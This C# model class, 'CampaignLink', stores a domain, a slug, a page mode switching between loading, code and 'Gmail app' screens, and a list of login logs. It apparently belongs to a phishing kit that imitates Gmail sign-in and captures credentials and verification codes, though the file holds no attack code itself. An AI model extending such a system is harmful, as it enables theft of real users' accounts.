namespace GmailApp.Models;

public class CampaignLink
{
    public int Id { get; set; }
    public string Domain { get; set; } = string.Empty;
    public string Slug { get; set; } = string.Empty;
    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;
    public bool IsLocked { get; set; }
    /// <summary>0 = Loading, 1 = Code, 2 = Gmail app</summary>
    public int PageMode { get; set; }
    public List<LoginLog> LoginLogs { get; set; } = [];

    public string FullUrl => $"{Domain.TrimEnd('/')}/{Slug.TrimStart('/')}";
}
